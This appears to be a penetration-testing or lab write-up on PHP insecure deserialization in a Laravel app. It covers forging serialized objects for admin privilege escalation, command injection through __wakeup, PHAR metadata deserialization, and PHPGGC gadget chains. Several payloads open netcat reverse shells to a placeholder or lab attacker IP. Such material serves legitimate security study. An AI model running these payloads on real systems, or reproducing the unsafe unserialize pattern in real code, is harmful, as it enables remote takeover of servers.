# Example 1 - PHP
We found a webapp with a `export settings` `import settings` function. When we try exporting our settings, we got this string:
```
TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntzOjMwOiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAE5hbWUiO3M6NzoicGVudGVzdCI7czozMToiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBFbWFpbCI7czoyMzoicGVudGVzdEBwZW50ZXN0LnBlbnRlc3QiO3M6MzQ6IgBBcHBcSGVscGVyc1xVc2VyU2V0dGluZ3MAUGFzc3dvcmQiO3M6NjA6IiQyeSQxMCROdjAyRWppUjNheDcwMFJNZUFtd2oua2JUOVNQaGNJMjhJT0dKN2ZadTIwL0pYNlhGZTRNYSI7czozNjoiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBQcm9maWxlUGljIjtzOjExOiJkZWZhdWx0LmpwZyI7fQ==
```
We try to base64 decode it, and got this string. It looks like a php serialized data.
```sh
$ echo 'TzoyNDoiQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzIjo0OntzOjMwOiIAQXBwXEhlbHBlcnNcVXNlclNldHRpbmdzAE5hbWUiO3M6NzoicGVudGVzdCI7czozMToiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBFbWFpbCI7czoyMzoicGVudGVzdEBwZW50ZXN0LnBlbnRlc3QiO3M6MzQ6IgBBcHBcSGVscGVyc1xVc2VyU2V0dGluZ3MAUGFzc3dvcmQiO3M6NjA6IiQyeSQxMCROdjAyRWppUjNheDcwMFJNZUFtd2oua2JUOVNQaGNJMjhJT0dKN2ZadTIwL0pYNlhGZTRNYSI7czozNjoiAEFwcFxIZWxwZXJzXFVzZXJTZXR0aW5ncwBQcm9maWxlUGljIjtzOjExOiJkZWZhdWx0LmpwZyI7fQ==' | base64 -d

O:24:"App\Helpers\UserSettings":5:{s:30:"App\Helpers\UserSettingsName";s:7:"pentest";s:31:"App\Helpers\UserSettingsEmail";s:23:"pentest@pentest.pentest";s:30:"App\Helpers\UserSettingsRole";s:4:"user";s:34:"App\Helpers\UserSettingsPassword";s:60:"$2y$10$Nv02EjiR3ax700RMeAmwj.kbT9SPhcI28IOGJ7fZu20/JX6XFe4Ma";s:36:"App\Helpers\UserSettingsProfilePic";s:11:"default.jpg";}
```
## Source analysis
When we see the source code for the `handleSettingsIE` function, we can see that it deserialize user input `base64` data into `userSettings` object without sanitizing/filtering
```php
public function handleSettingsIE(Request $request) {
    if (Auth::check()) {
        if (isset($request['export'])) {
            $user = Auth::user();
            $userSettings = new UserSettings($user->name, $user->email, $user->role, $user->password, $user->profile_pic);
            $exportedSettings = base64_encode(serialize($userSettings));

            Session::flash('ie-message', 'Exported user settings!');
            Session::flash('ie-exported-settings', $exportedSettings);
        } 
        else if (isset($request['import']) && !empty($request['settings'])) {
            $userSettings = unserialize(base64_decode($request['settings']));
            $user = Auth::user();
            $user->name = $userSettings->getName();
            $user->email = $userSettings->getEmail();
            $user->role = $userSettings->getRole();
            $user->password = $userSettings->getPassword();
            $user->profile_pic = $userSettings->getProfilePic();
            $user->save();
                
            Session::flash('ie-message', "Imported settings for '" . $userSettings->getName() . "'");
        }
        return back();
    }
    return redirect("/login")->withSuccess('You must be logged in to complete this action');
}
```
And this is the source code of `userSettings` class:
```php
<?php

namespace App\Helpers;

class UserSettings {
    private $Name;
    private $Email;
    private $Role;
    private $Password;
    private $ProfilePic;

    public function getName() {
        return $this->Name;
    }
    public function getEmail() {
        return $this->Email;
    }
    public function getRole() {
        return $this->Role;
    }
    public function getPassword() {
        return $this->Password;
    }
    public function getProfilePic() {
        return $this->ProfilePic;
    }
    public function setName($Name) {
        $this->Name = $Name;
    }
    public function setEmail($Email) {
        $this->Email = $Email;
    }
    public function setRole($Role) {
        $this->Role = $Role;
    }
    public function setPassword($Password) {
        $this->Password = $Password;
    }
    public function setProfilePic($ProfilePic) {
        $this->ProfilePic = $ProfilePic;
    }
    public function __construct($Name, $Email, $Role, $Password, $ProfilePic) {
        $this->setName($Name);
        $this->setEmail($Email);
        $this->setRole($Role);
        $this->setPassword($Password);
        $this->setProfilePic($ProfilePic);
    }
    public function __wakeup() {
        shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
    }
    public function __sleep() {
        return array("Name", "Email", "Password", "ProfilePic");
    }
}
```
We can see that aside from storing user settings, it also has `__wakeup()` function that uses `shell_exec()`, which means potential command injection
## Privesc
We find the file with the `UserSettings` class, go in and create `target.php` file like this
```sh
$ grep -nr 'class UserSettings {' .
./app/Helpers/UserSettings.php:5:class UserSettings {

$ cd app/Helpers

$ vim target.php
```
And we will put this in our `target.php` file, the parameters we feed into this class is the same as our account settings, but we changed the role to `admin`
```php
<?php
include('UserSettings.php');

echo base64_encode(
	serialize(
		new \App\Helpers\UserSettings('pentest', 'pentest@pentest.pentest', 'admin', '$2y$10$Nv02EjiR3ax700RMeAmwj.kbT9SPhcI28IOGJ7fZu20/JX6XFe4Ma', 'default.jpg')
	)
);
```
And when we run our `target.php` file, we got a base64 string
```sh
$ php ./target.php
TzoyNDoiQXBwXEhlbHBlcnMAc2VyU2V0dGluZ3MiOjU6e3M6MzA6IkFwcFxIZWxwZXJzAHNlclNldHRpbmdzTmFtZSI7czo3OiJwZW50ZXN0IjtzOjMxOiJBcHBcSGVscGVycwBzZXJTZXR0aW5nc0VtYWlsIjtzOjIzOiJwZW50ZXN0QHBlbnRlc3QucGVudGVzdCI7czozMDoiQXBwXEhlbHBlcnMAc2VyU2V0dGluZ3NSb2xlIjtzOjU6ImFkbWluIjtzOjM0OiJBcHBcSGVscGVycwBzZXJTZXR0aW5nc1Bhc3N3b3JkIjtzOjYwOiIkMnkkMTAkTnYwMkVqaVIzYXg3MDBSTWVBbXdqLmtiVDlTUGhjSTI4SU9HSjdmWnUyMC9KWDZYRmU0TWEiO3M6MzY6IkFwcFxIZWxwZXJzAHNlclNldHRpbmdzUHJvZmlsZVBpYyI7czoxMToiZGVmYXVsdC5qcGciO30=
```
Now we just need to feed this into the import settings function, and we have privesc
## Command injection
Back to the `UserSettings.php` code, we can see that it has `__wakeup()` function like this
```php
	public function __wakeup() {
        shell_exec('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
    }
```
In PHP, functions whose names start with `__` are reserved for the language and is called `magic methods`. These are special methods that overwrite default PHP actions when invoked on an object
In total, PHP has 17 `magic methods`. Ranked based on their [usage](https://www.exakat.io/en/most-popular-php-magic-methods/) in open-source projects, they are the following:

| Method        | Description                                                                                                                                       |
| ------------- | ------------------------------------------------------------------------------------------------------------------------------------------------- |
| __construct   | Define a constructor for a class. Called when a new instance is created. E.g. `new Class()`                                                       |
| __toString    | Define how an object reacts when treated as a string. E.g. `echo $obj`                                                                            |
| __call        | Called when you try to call inaccessible methods in an **object** context E.g. `$obj->doesntExist()`                                              |
| __get         | Called when you try to read inaccessible properties E.g. `$obj->doesntExist`                                                                      |
| __set         | Called when you try to write inaccessible properties E.g. `$obj->doesntExist = 1`                                                                 |
| __clone       | Called when you try to clone an object E.g. `$copy = clone $object`                                                                               |
| __destruct    | Called when an object is destroyed (Opposite of constructor)                                                                                      |
| __isset       | Called when you try to call `isset()` or `isempty()` on inaccessible properties E.g. `isset($obj->doesntExist)`                                   |
| __invoke      | Called when you try to invoke an object as a function, e.g. `$obj()`                                                                              |
| __sleep       | Called when serializing an object. If __serialize and __sleep are defined, the latter is ignored. E.g. `serialize($obj)`                          |
| __wakeup      | Called when deserializing an object. If __unserialize and __wakeup are defined, the latter is ignored. E.g. `unserialize($ser_obj)`               |
| __unset       | Called when you try to unset inaccessible properties E.g. `unset($obj->doesntExist)`                                                              |
| __callStatic  | Called when you try to call inaccessible methods in a **static** context E.g. `Class::doesntExist()`                                              |
| __set_state   | Called when `var_export` is called on an object E.g. `var_export($obj, true)`                                                                     |
| __debuginfo   | Called when `var_dump` is called on an object E.g. `var_dump($obj)`                                                                               |
| __unserialize | Called when deserializing an object. If __unserialize and __wakeup are defined, __unserialize is used. Only in PHP 7.4+. E.g. `unserialize($obj)` |
| __serialize   | Called when serializing an object. If __serialize and __sleep are defined, __serialize is used. Only in PHP 7.4+. E.g. `unserialize($obj)`        |
According to the table above, we can see that `__wakeup()` is called when deserialize an object. Meaning every time we use `import settings` function, the `shell_exec()` is called
So, using the same `target.php` we created on [#Privesc]({{< relref "#privesc" >}}), we create our payload like this to exploit the command injection.
```php
<?php
include('UserSettings.php');

echo base64_encode(
	serialize(
		new \App\Helpers\UserSettings(';nc -nv <ATTACKER_IP> 9001 -e /bin/bash;#', 'pentest@pentest.pentest', 'admin', '$2y$10$Nv02EjiR3ax700RMeAmwj.kbT9SPhcI28IOGJ7fZu20/JX6XFe4Ma', 'default.jpg')
	)
);
```
Be aware that running this **will also run the payload on YOUR SYSTEM**. If you don't want it, go back and change the `UserSettings.php` code like this, so it will print out the command instead of running it. In php, when serialize an object, it don't care about the function inside, so we can change the code
```php
	public function __wakeup() {
        print('echo "$(date +\'[%d.%m.%Y %H:%M:%S]\') Imported settings for user \'' . $this->getName() . '\'" >> /tmp/htbank.log');
    }
```
Run the exploit, feed this to the import settings function again and we should get a reverse shell
```sh
$ php ./target.php
<Insert Some Base64 String Output>
```
## Phar Deserialization
Now here's another function of the webapp. We can update our profile pic. This is the logic for uploading pics:
Basically, we upload a pic, the webapp stores it in `uploads/<file name>.jpg`. The `.jpg` extension is hard coded, so we can't just upload a `.php` file to get RCE, the file name is also random.
```php
if (!empty($request["profile_pic"])) {
  $file = $request->file('profile_pic');
  $fname = md5(random_bytes(20));
  $file->move('uploads',"$fname.jpg");
  $user->profile_pic = "uploads/$fname.jpg";
}
```
However, there is also a function at `/image`
```php
Route::get('/image', [HTController::class, 'getImage'])->name('getImage');
```
What it does it essentially use `file_exists()` on a user input path. if the file exists, we get redirected to the file
```php
public function getImage(Request $request) {
  if (file_exists($request->query('_')))
    return redirect($request->query('_'));
  else
    return redirect("/default.jpg");
}
```
This means that we can supply any path to the `file_exists()` function, like this: `/image?_=uploads/anyfile.png`
A little explanation:
- In `PHP`, a `PHAR` is a archive of entire `PHP` application. And we can access any file in the archive with `phar://` like this: `phar:///path/to/phar.phar/file.php`
- A PHAR archive can have metadata. According to the PHP [documentation](https://www.php.net/manual/en/phar.getmetadata.php), metadata can be **any PHP variable that can be serialized**. PHP version **below 8.0** will [automatically deserialize metadata](https://github.com/php/php-src/blob/PHP-7.4/ext/phar/phar.c#L621) when parsing a PHAR file.
- Parsing a PHAR file means any file operation is called in PHP with the `phar://` wrapper, including `file_exists()`
So, we can force the webapp to deserialize an object by:
- Uploading a phar archive with metadata contains a serialized object
- Access `/image?_=phar://uploads/<MD5>.jpg`

We will create a `PHAR` archive like this. It set the metadata to a serialized `UserSettings` object with the command injection payload like in [#Command injection]({{< relref "#command-injection" >}})
```php
<?php
include('UserSettings.php');

$phar = new Phar("exploit.phar");

$phar->startBuffering();

$phar->addFromString('0', '');
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata(new \App\Helpers\UserSettings('"; nc -nv <ATTACKER_IP> 9999 -e /bin/bash;#', 'attacker@htbank.com', '$2y$10$u5o6u2EbjOmobQjVtu87QO8ZwQsDd2zzoqjwS0.5zuPr3hqk9wfda', 'default.jpg'));

$phar->stopBuffering();
```
You may run into the following error when generating the exploit:
```
PHP Fatal error:  Uncaught UnexpectedValueException: creating archive "exploit.phar" disabled by the php.ini setting phar.readonly in XXXXX
Stack trace:
#0 XXXXX: Phar->__construct()
#1 {main}
  thrown in XXXXX on line XX
```
If you get this error, modify `/etc/php/7.4/cli/php.ini` like so and then run it again:
```ini
[Phar]
; phar.readonly = On
phar.readonly = Off
```
Now we just upload the `exploit.phar` onto the webapp, get the file location, then invoke `file_exists()` on the `PHAR` by accessing `/image?_=phar://uploads/<MD5>.jpg`
## Tools
```sh
sudo apt update && sudo apt install -y phpggc
```
[PHPGGC](https://github.com/ambionics/phpggc) is a tool by [Ambionics](https://www.ambionics.io/), which contains a collection of `gadget chains` built from vendor code in a bunch of PHP frameworks which allow us to achieve various actions, including file reads, writes, and RCE via deserialization
For example, we can list all `laravel` deserialization exploits like this
```sh
$ phpggc -l Laravel

Gadget Chains
-------------

NAME             VERSION            TYPE                   VECTOR        I    
Laravel/RCE1     5.4.27             RCE (Function call)    __destruct         
Laravel/RCE10    5.6.0 <= 9.1.8+    RCE (Function call)    __toString         
Laravel/RCE2     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE3     5.5.0 <= 5.8.35    RCE (Function call)    __destruct    *    
Laravel/RCE4     5.4.0 <= 8.6.9+    RCE (Function call)    __destruct         
Laravel/RCE5     5.8.30             RCE (PHP code)         __destruct    *    
Laravel/RCE6     5.5.* <= 5.8.35    RCE (PHP code)         __destruct    *    
Laravel/RCE7     ? <= 8.16.1        RCE (Function call)    __destruct    *    
Laravel/RCE8     7.0.0 <= 8.6.9+    RCE (Function call)    __destruct    *    
Laravel/RCE9     5.4.0 <= 9.1.8+    RCE (Function call)    __destruct         
```
And we can create payload like this. This will call `system()` with `'nc -nv <ATTACKER_IP> 9999 -e /bin/bash'` as argument, and `-b` for `base64`
```sh
$ phpggc Laravel/RCE9 system 'nc -nv 10.10.14.151 9001 -e /bin/bash' -b
Tzo0MDoiSWxsdW1pbmF0ZVxCcm9hZGNhc3RpbmdcUGVuZGluZ0Jyb2FkY2FzdCI6Mjp7czo5OiIAKgBldmVudHMiO086MjU6IklsbHVtaW5hdGVcQnVzXERpc3BhdGNoZXIiOjU6e3M6MTI6IgAqAGNvbnRhaW5lciI7TjtzOjExOiIAKgBwaXBlbGluZSI7TjtzOjg6IgAqAHBpcGVzIjthOjA6e31zOjExOiIAKgBoYW5kbGVycyI7YTowOnt9czoxNjoiACoAcXVldWVSZXNvbHZlciI7czo2OiJzeXN0ZW0iO31zOjg6IgAqAGV2ZW50IjtPOjM4OiJJbGx1bWluYXRlXEJyb2FkY2FzdGluZ1xCcm9hZGNhc3RFdmVudCI6MTp7czoxMDoiY29ubmVjdGlvbiI7czozNzoibmMgLW52IDEwLjEwLjE0LjE1MSA5MDAxIC1lIC9iaW4vYmFzaCI7fX0=
```
We can also create a `PHAR` deserialization payload like this:
```sh
$ phpggc -p phar Laravel/RCE9 system 'nc -nv 10.10.14.151 9001 -e /bin/bash' -o exploit.phar
```